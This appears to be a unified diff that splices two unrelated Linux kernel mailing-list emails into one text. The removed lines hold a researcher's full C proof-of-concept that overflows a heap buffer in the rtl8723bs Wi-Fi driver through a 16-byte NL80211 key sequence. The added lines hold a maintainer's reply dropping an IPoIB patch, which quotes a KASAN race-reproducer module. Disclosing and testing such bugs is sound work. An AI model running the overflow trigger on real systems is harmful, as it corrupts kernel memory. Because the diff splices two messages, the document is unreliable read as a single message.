@@ -1,60 +1,51 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.96
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793801105;
-	b=XLZ2lP9uYgpgGUOj3HT1Hjo+QzSasf0fr7xmkxLFWlgjmx4HrmO6EVjzD4leCq/VSh3N
-	 mx0cgfnju+JUBz0C07GOP6fBGg+yXueaKuTCan3g263nQ73FkpRjR6+oFrtktiJIW/ytY
-	 WH5OFiREJxH8ZS6I5PNVW0Za941l1v0eBgtoTNwa76fGKeTEEZJWyZNrqdMWhBD719GlT
-	 zqN+ANOq2OcMoKXSPp0svC0CMlzfBRc/A4uRSs2vge+K7jw590GW5Ab6b3+n6vIbdsLFk
-	 l7gBvBFS2RJSTweRsUElteFQMg8WPoYn8yHSVkMBkxEYif5Xd6W8hugkl6+VJgxFbDQ==
+	t=1793801173;
+	b=nVCKVli43y4IBHZlpzattUBX06e34Kgyuik1aRbiNCsHdJJcquQugpDgF+OvFbSgB1fQ
+	 lOEOlNjxwpthU0+ReiRanDoy2lWXItCrru1eHEW02GrFPfrpO7DR8EIQoRH+it1KzbQaf
+	 vNyLr83UPbDzTO73o2lmIh2C8cfKmyIcOCjOzgqub3cfahtQsyxymQFqXjKAiiroRw2DK
+	 jn/bMuRCPmy07HDv7E+tCycTJ/7Rk/XTI80zvtFsdvBW/OxGnRwZiyz2iIeF9tr9P59xw
+	 s2VZKPb+sCJD0Uc3D2x+ugTzjvLjHlN/VJKsYLevZdVmFbqno/Fzp12XpDWkJ8KhnnA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793801105;
-	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
-	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
-	 Content-Type:Content-Transfer-Encoding;
-	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
-	b=U2vJY6XRFxJWdoPwCn16HzX33eBRftShovS5zDe8JN+DAtAhkWCkREWEQ6kxYL9Vci6G
-	 SZAvvsXvurTr+D6vT8eX/xzqw0CbbjBJj8Ir8Paui8nJFIu3xuf4nFCWi/c2c5ruapfGF
-	 w27le0Pr4hagvoPnBisbwHv69t/HjbZmwJJc5zao/l2Bk27NkoOHfshud7TC5Ibia4STi
-	 NQGB78+tZaIi7abe5so9lc9SEJkmcxa6D89FBhJhk60rwzbPByOmqp5JhRHiK+d0J1mQ/
-	 ++KuYEOV/QmpnyjgDnuYDVnFyWIaKP4GeQRi5s9yMHHRjgifipJ+rSn1ZHGFgz7nPrA==
+	a=rsa-sha256; c=relaxed/relaxed; t=1793801173;
+	h=Received:DKIM-Signature:Date:From:To:Cc:Subject:Message-ID:
+	 References:MIME-Version:Content-Type:Content-Disposition:In-Reply-To;
+	bh=uH/6JLhT16+uh3bW5gdjq+6yXQL9dmv7OYBFAVG5ong=;
+	b=dzDqSkqY3oCP9OrH6dgkgrpiBidRFPEKHv9i9+bsXrvGXDyYlNraoei5u8tFUp6ZX8JC
+	 TigcwsG+Ti9UOPH1RJFjPE2OFZVvv6ATNP/a16w9pfwDkE3yH6d8bmVrFoZZ3TmASnabP
+	 lfacWOtnap1A7Y2ulmmI8RAVo4baFnjYCZgW7crAG/MAX9pkIiPQrO/YdZGhGOJDXQzP3
+	 T17a2ZMWZuHayvSUJs0P60G32630c5F1xDz8rS5ShBBHvRNQCqOQGf9Y5gT4pAu2SJ006
+	 fnijdYhXPO/A5pSZB1y5ruMiXHQMxVarIcBYl8pbdZegqTJ18rnVValErF1+m5sTRXQ==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=innora.ai;
-	spf=pass smtp.mailfrom=innora.ai;
-	dkim=pass header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1;
-	arc=none smtp.remote-ip=185.70.43.96
-Received: from mail-4396.protonmail.ch (mail-4396.protonmail.ch [185.70.43.96])
+	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=bwj21dMA;
+	arc=none smtp.remote-ip=100.103.45.18
+Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
+	 key-exchange X25519 server-signature ECDSA (prime256v1))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8998D606A326
-	for <stable@vger.kernel.org>; Wed,  4 Nov 2026 14:04:59 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8998D606A326
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D0478606A31B;
+	Wed,  4 Nov 2026 14:06:12 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
-	s=protonmail3; t=1793801096; x=1794060296;
-	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
-	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
-	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
-	 Message-ID:BIMI-Selector;
-	b=ZUE8W9w1ZW0t76mfKHFrM6uwG6egPoDuPvHiV5Tf1+qTy4slP24Dlww+EQnrK0E+1
-	 GaMUZ1N0C8n9pMazgN7HLXk1H8hpOUI//CTatvFesy+W1cTp5gS60uoUKqL4FphTB6
-	 x/hodMv8V4JcLMsY6V+MSZsrnsgg3KqrT41KCjtwbk1axUTux8Ucre/4vgFbN0vMCT
-	 gBUgmNbCidITKDgaCyA7/F8cdjcVjRiUYYwQ0uIYsjb51pSNCLcfC7ANDQzme48sIe
-	 NFNvap26A7G8h+fy+OjTiaaqc+9f/d3/s57hae8+VnHv22DLaG3uyGd6tjgKh4paR6
-	 l6dlRmBGySvlA==
-Date: Wed, 04 Nov 2026 14:04:50 +0000
-To: gregkh@linuxfoundation.org
-From: Feng Ning <feng@innora.ai>
-Cc: linux-staging@lists.linux.dev, linux-wireless@vger.kernel.org, luka.gejak@linux.dev, linux-kernel@vger.kernel.org, stable@vger.kernel.org, Feng Ning <feng@innora.ai>
-Subject: Re: [RFC PATCH v7] staging: rtl8723bs: fix heap buffer overflow in cfg80211_rtw_add_key()
-Message-ID: <20261104220434.677da673-2-feng@innora.ai>
-In-Reply-To: <20261104220347.ccc09fa4-1-feng@innora.ai>
-References: <20260413113224.5201-1-feng@innora.ai> <2026042626-tabloid-suitor-33c5@gregkh> <20260427111738.33069-1-feng@innora.ai> <2026050417-monkhood-backless-4c3e@gregkh> <20260504154823.52057-1-feng@innora.ai> <2026050458-numbness-haven-1ae4@gregkh> <20261104220347.ccc09fa4-1-feng@innora.ai>
-Feedback-ID: 140578448:user:proton
-X-Pm-Message-ID: 4cf252529bc12bbb696741956dbf03401e3d81c8
+	dkim=pass (2048-bit key, unprotected) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=bwj21dMA
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 84D1E1F00A02;
+	Wed,  4 Nov 2026 14:06:11 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1793801172;
+	bh=uH/6JLhT16+uh3bW5gdjq+6yXQL9dmv7OYBFAVG5ong=;
+	h=Date:From:To:Cc:Subject:References:In-Reply-To;
+	b=bwj21dMA2bAt5X0SBhxl1ciJ2aZjBzaohvzuvHnnQ2tDGvIHJ/RF53Qp2h1CWpMig
+	 EZp6Ph6/MTKHktLMN8c/NiEEFc4LwvljmJJksKjPB/TsLhJ8XXjzNPheYTjO0Ps0Sz
+	 esTC2l4gORhcFk1Bby+JEQO7wrkmR5tinkTw9dTsYg/QSiIZRL9UIc7W/qKyB/IP+Q
+	 vPodoz+msQIcFomqeSur4lcBoR6t//kfIFcgPUqO6NXH/GGVF3YqhcCyT/ImIjB5Wd
+	 m+MkDQuBlrs47seDt7WpsUQjJxGzG7jmVOuEFqYD2/8O3a8qQKlso83Or4z1m0VzM6
+	 j5vC5Tl1yoTwg==
+Date: Wed, 4 Nov 2026 16:06:08 +0200
+From: Leon Romanovsky <leon@kernel.org>
+To: Chengyu Liu <lui2012qwq@gmail.com>
+Cc: jgg@ziepe.ca, linux-rdma@vger.kernel.org, stable@vger.kernel.org
+Subject: Re: [PATCH] RDMA/ipoib: cancel the AH reaper work synchronously
+Message-ID: <20261104140608.GF478286@unreal>
+References: <20261103170703.1600310-1-lui2012qwq@gmail.com>
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
 List-Post: <mailto:stable@vger.kernel.org>
@@ -64,173 +55,192 @@ List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:stable+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20261103170703.1600310-1-lui2012qwq@gmail.com>
 
-As mentioned in the RFC, here is the userspace trigger for the
-overflow, for anyone with rtl8723bs hardware willing to test.
+On Wed, Nov 04, 2026 at 01:07:03AM +0800, Chengyu Liu wrote:
+> ipoib_stop_ah_reaper() uses cancel_delayed_work(), which cannot stop a
+> callback that is already running.  ipoib_reap_ah() re-arms itself after
+> an unlocked test_bit(IPOIB_STOP_REAPER) check, so a callback that has
+> passed the check but has not re-armed yet still queues the delayed work
+> after the "stop":
+> 
+>   CPU0 (reaper)                     CPU1 (stop/teardown)
+>   test_bit(STOP_REAPER) == 0
+>                                     set_bit(STOP_REAPER)
+>                                     cancel_delayed_work()  (no-op)
+>                                     ... destroy_workqueue(priv->wq)
+>   queue_delayed_work(priv->wq, ...)  <- delayed work sits on the timer
+> 
+> destroy_workqueue() cannot see a delayed work that is pending on the
+> timer wheel, so the re-armed work fires after the workqueue is
+> destroyed and priv is freed: both the queueing onto the dead queue and
+> the callback's container_of() on freed memory are use-after-free.
+> 
+> Use cancel_delayed_work_sync(), which waits for a running callback and
+> prevents its re-arm from taking effect.
+> 
+> The comment above claims ipoib_reap_dead_ahs() "ensures the work is
+> really stopped", but it never touches the work item - it only walks the
+> dead_ahs list under priv->lock.  The stop guarantee comes from the
+> cancel; fix the comment along with it.
+> 
+> Found by static analysis.  The race was reproduced on a KASAN build
+> with a small module exercising this exact guard/cancel/free pattern
+> (no Infiniband hardware available); PoC and splat are below.
 
-It sends NL80211_CMD_NEW_KEY with a 16-byte NL80211_ATTR_KEY_SEQ
-(8 bytes more than ieee_param.crypt.seq holds) on a monitor-less
-managed interface.  On an unpatched kernel with KASAN enabled it
-should produce:
+Please revisit this once you can reproduce the issue with real IPoIB code,
+not code that merely resembles it.
 
-  BUG: KASAN: slab-out-of-bounds in cfg80211_rtw_add_key
-  Write of size 16 ...
+Dropped for now.
 
-On a kernel with the v7 patch applied, the same command should
-return NLMSG_ERROR with errno EINVAL and no splat.
+Thanks
 
-Build (needs libnl-3.0 / libnl-genl-3.0):
-
-  gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs libnl-3.0 libn=
-l-genl-3.0)
-
-Run:
-
-  sudo ./poc wlan0
-
-Requires CAP_NET_ADMIN and an rtl8723bs interface present.
-
---- poc_seq_overflow.c ---
-
-/*
- * PoC: rtl8723bs cfg80211_rtw_add_key seq[] heap buffer overflow
- *
- * Bug:  drivers/staging/rtl8723bs/os_dep/ioctl_cfg80211.c ~line 887
- *       memcpy(param->u.crypt.seq, params->seq, params->seq_len);
- *
- *       param->u.crypt.seq =3D u8 seq[8]  (fixed 8 bytes, ieee80211.h:190)
- *       params->seq_len    =3D up to 16   (NL80211_KEY_SEQ .len=3D16, nl80=
-211.c:956)
- *       Result: 8-byte heap overflow WRITE past seq[8]
- *
- * Overwritten fields (struct ieee_param.u.crypt):
- *       offset 37: seq[8]    =E2=86=90 8 bytes written legitimately
- *       offset 45: pad       =E2=86=90 1 byte overflow
- *       offset 46: key_len   =E2=86=90 2 bytes overflow (u16, corrupted)
- *       offset 48: key[]     =E2=86=90 5 bytes overflow
- *
- * Trigger: NL80211_CMD_NEW_KEY with 16-byte NL80211_ATTR_KEY_SEQ
- * Requires: CAP_NET_ADMIN + rtl8723bs WiFi interface loaded
- * Build:    gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs lib=
-nl-3.0 libnl-genl-3.0)
- * Run:      sudo ./poc wlan0
- * Expect:   dmesg =E2=86=92 KASAN: slab-out-of-bounds WRITE in cfg80211_rt=
-w_add_key
- *
- * CWE-122 | CVSS 6.7 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
- *
- * Author: Feng Ning (feng@innora.ai) =E2=80=94 Innora Security Research
- */
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <net/if.h>
-#include <netlink/genl/genl.h>
-#include <netlink/genl/ctrl.h>
-
-/* nl80211 command and attribute IDs */
-#define NL80211_CMD_NEW_KEY       13
-#define NL80211_ATTR_IFINDEX       3
-#define NL80211_ATTR_KEY_DATA     25
-#define NL80211_ATTR_KEY_IDX      26
-#define NL80211_ATTR_KEY_CIPHER   27
-#define NL80211_ATTR_KEY_SEQ      28
-#define WLAN_CIPHER_SUITE_TKIP    0x000FAC02
-
-int main(int argc, char **argv)
-{
-    struct nl_sock *sk;
-    struct nl_msg *msg;
-    int fam, ifidx, ret;
-
-    if (argc < 2) {
-        fprintf(stderr, "Usage: sudo %s <wlan_interface>\n", argv[0]);
-        fprintf(stderr, "  Requires rtl8723bs driver and CAP_NET_ADMIN\n");
-        return 1;
-    }
-
-    ifidx =3D if_nametoindex(argv[1]);
-    if (!ifidx) {
-        perror("if_nametoindex");
-        return 1;
-    }
-
-    sk =3D nl_socket_alloc();
-    if (!sk) { perror("nl_socket_alloc"); return 1; }
-
-    if (genl_connect(sk) < 0) {
-        fprintf(stderr, "genl_connect failed\n");
-        return 1;
-    }
-
-    fam =3D genl_ctrl_resolve(sk, "nl80211");
-    if (fam < 0) {
-        fprintf(stderr, "nl80211 family not found\n");
-        return 1;
-    }
-
-    msg =3D nlmsg_alloc();
-    genlmsg_put(msg, 0, 0, fam, 0, 0, NL80211_CMD_NEW_KEY, 0);
-
-    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifidx);
-    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, 0);
-    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_TKIP);
-
-    /* TKIP requires 32-byte key */
-    uint8_t key[32];
-    memset(key, 0x41, sizeof(key));
-    nla_put(msg, NL80211_ATTR_KEY_DATA, sizeof(key), key);
-
-    /*
-     * OVERFLOW TRIGGER
-     *
-     * NL80211_ATTR_KEY_SEQ with 16 bytes.  nl80211.c allows up to 16.
-     * cfg80211 passes this to driver as params->seq / params->seq_len=3D16=
-.
-     * rtl8723bs copies all 16 bytes into seq[8] =E2=86=92 8 bytes past bou=
-ndary.
-     *
-     * The overflow pattern 0x42 ('B') will be visible in KASAN output
-     * and in the corrupted key_len / key[] fields.
-     */
-    uint8_t seq[16];
-    memset(seq, 0x42, sizeof(seq));
-    nla_put(msg, NL80211_ATTR_KEY_SEQ, sizeof(seq), seq);
-
-    printf("[*] rtl8723bs seq[] heap overflow PoC\n");
-    printf("[*] Interface: %s (ifindex %d)\n", argv[1], ifidx);
-    printf("[*] Sending NL80211_CMD_NEW_KEY with seq_len=3D16 (buffer=3D8)\=
-n");
-
-    ret =3D nl_send_auto(sk, msg);
-    if (ret < 0)
-        fprintf(stderr, "[-] send failed: %s\n", nl_geterror(ret));
-    else
-        printf("[+] Sent %d bytes\n", ret);
-
-    /* Receive response (will likely be -ENOLINK or similar, but overflow
-     * already happened in the driver before the error path) */
-    nl_recvmsgs_default(sk);
-
-    nlmsg_free(msg);
-    nl_socket_free(sk);
-
-    printf("[*] Done. Check 'dmesg | grep KASAN' for heap overflow report.\=
-n");
-    return 0;
-}
-
---- end ---
-
-I have verified the trigger path by code review of the cfg80211 key
-installation path (nl80211 NL80211_KEY_SEQ policy allows .len =3D 16
-while the driver buffer is 8 bytes) but do not have the hardware to
-run it myself; that is exactly what a Tested-by from this list would
-add.
-
-Thanks,
-Feng Ning
-
+> 
+> Cc: stable@vger.kernel.org
+> Signed-off-by: Chengyu Liu <lui2012qwq@gmail.com>
+> ---
+> 
+> Reproducer notes (PoC source below; a module parameter selects the
+> shape): mode=3 (cancel_delayed_work + lockless guard race, this bug's shape) produces
+> 
+>     [    2.05] BUG: KASAN: slab-use-after-free in queue_delayed_work_on+0x27/0x70
+>     [    2.05] Workqueue: events pm_td_cb [pm_flush_poc]
+> 
+> after the teardown frees the container; mode=1
+> (cancel_delayed_work_sync, i.e. this fix) stays clean.
+> 
+> ---------------------------- reproducer: pm_flush_poc.c ----------------------------
+> // SPDX-License-Identifier: GPL-2.0
+> /*
+>  * pm_teardown_poc - mechanism PoC for the drv-teardown-sync C/D variants
+>  * (F-026 ipoib / F-028 epf-ntb / F-029 habanalabs).
+>  *
+>  * Modes (module parameter):
+>  *   0  F-029 vuln shape:  flush_delayed_work + lockless guard
+>  *   1  control:           cancel_delayed_work_sync (>=6.9 swallows re-arm)
+>  *   2  F-028 vuln shape:  cancel_delayed_work (non-sync) + unconditional re-arm
+>  *   3  F-026 vuln shape:  cancel_delayed_work (non-sync) + guard check/queue
+>  *                         race window (test passes, teardown slips in before
+>  *                         the queue_delayed_work)
+>  *
+>  * Every vuln mode must produce KASAN slab-use-after-free when the orphaned
+>  * work fires after kfree; the control mode must stay clean.
+>  */
+> #include <linux/module.h>
+> #include <linux/workqueue.h>
+> #include <linux/slab.h>
+> #include <linux/delay.h>
+> 
+> static int mode;
+> module_param(mode, int, 0444);
+> MODULE_PARM_DESC(mode, "0=flush(F-029) 1=cancel_sync(ctrl) 2=cancel_nosync(F-028) 3=cancel_nosync+guard-race(F-026)");
+> 
+> struct pm_td_ctx {
+> 	bool			fini_pending;
+> 	struct delayed_work	work;
+> };
+> 
+> static struct pm_td_ctx *ctx;
+> 
+> static void pm_td_cb(struct work_struct *w)
+> {
+> 	struct pm_td_ctx *c = container_of(to_delayed_work(w),
+> 					   struct pm_td_ctx, work);
+> 
+> 	pr_info("PM-POC: cb running, fini_pending=%d\n", c->fini_pending);
+> 
+> 	switch (mode) {
+> 	case 0:		/* F-029: lockless guard then long body then re-arm */
+> 		if (c->fini_pending)
+> 			return;
+> 		msleep(300);
+> 		schedule_delayed_work(&c->work, HZ / 10);
+> 		pr_info("PM-POC: re-armed (flush shape)\n");
+> 		break;
+> 	case 2:		/* F-028: unconditional re-arm, cancel must catch running cb */
+> 		msleep(300);	/* long body so cancel lands mid-run */
+> 		schedule_delayed_work(&c->work, HZ / 10);
+> 		pr_info("PM-POC: re-armed (no guard)\n");
+> 		break;
+> 	case 3:		/* F-026: guard check passes, THEN teardown slips in */
+> 		if (c->fini_pending)
+> 			return;
+> 		/* widen the check->queue race window like ipoib's 724->725 */
+> 		msleep(300);
+> 		schedule_delayed_work(&c->work, HZ / 10);
+> 		pr_info("PM-POC: re-armed past guard (test-queue race)\n");
+> 		break;
+> 	default:
+> 		break;
+> 	}
+> }
+> 
+> static int __init pm_poc_init(void)
+> {
+> 	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
+> 	if (!ctx)
+> 		return -ENOMEM;
+> 	ctx->fini_pending = false;
+> 	INIT_DELAYED_WORK(&ctx->work, pm_td_cb);
+> 
+> 	pr_info("PM-POC: arming, mode=%d\n", mode);
+> 	schedule_delayed_work(&ctx->work, 0);
+> 
+> 	msleep(50);	/* callback is mid-run now */
+> 
+> 	/* teardown sequence for the selected variant */
+> 	ctx->fini_pending = true;
+> 	switch (mode) {
+> 	case 1:
+> 		cancel_delayed_work_sync(&ctx->work);
+> 		break;
+> 	case 0:
+> 		flush_delayed_work(&ctx->work);
+> 		break;
+> 	default:
+> 		cancel_delayed_work(&ctx->work);	/* non-sync: C variants */
+> 		break;
+> 	}
+> 
+> 	pr_info("PM-POC: teardown done, freeing ctx\n");
+> 	kfree(ctx);
+> 
+> 	msleep(600);
+> 	pr_info("PM-POC: SURVIVED (no KASAN splat)\n");
+> 	return 0;
+> }
+> 
+> static void __exit pm_poc_exit(void) { }
+> 
+> module_init(pm_poc_init);
+> module_exit(pm_poc_exit);
+> MODULE_LICENSE("GPL");
+> MODULE_DESCRIPTION("drv-teardown-sync C/D variant mechanism PoC (F-026/028/029)");
+> 
+>  drivers/infiniband/ulp/ipoib/ipoib_ib.c | 6 +++---
+>  1 file changed, 3 insertions(+), 3 deletions(-)
+> 
+> diff --git a/drivers/infiniband/ulp/ipoib/ipoib_ib.c b/drivers/infiniband/ulp/ipoib/ipoib_ib.c
+> index 81bbb3f7c1..5ed4f709cb 100644
+> --- a/drivers/infiniband/ulp/ipoib/ipoib_ib.c
+> +++ b/drivers/infiniband/ulp/ipoib/ipoib_ib.c
+> @@ -736,11 +736,11 @@ static void ipoib_start_ah_reaper(struct ipoib_dev_priv *priv)
+>  static void ipoib_stop_ah_reaper(struct ipoib_dev_priv *priv)
+>  {
+>  	set_bit(IPOIB_STOP_REAPER, &priv->flags);
+> -	cancel_delayed_work(&priv->ah_reap_task);
+> +	cancel_delayed_work_sync(&priv->ah_reap_task);
+>  	/*
+>  	 * After ipoib_stop_ah_reaper() we always go through
+> -	 * ipoib_reap_dead_ahs() which ensures the work is really stopped and
+> -	 * does a final flush out of the dead_ah's list
+> +	 * ipoib_reap_dead_ahs() which does a final flush out of the
+> +	 * dead_ah's list
+>  	 */
+>  }
+>  
+> -- 
+> 2.25.1
+> 
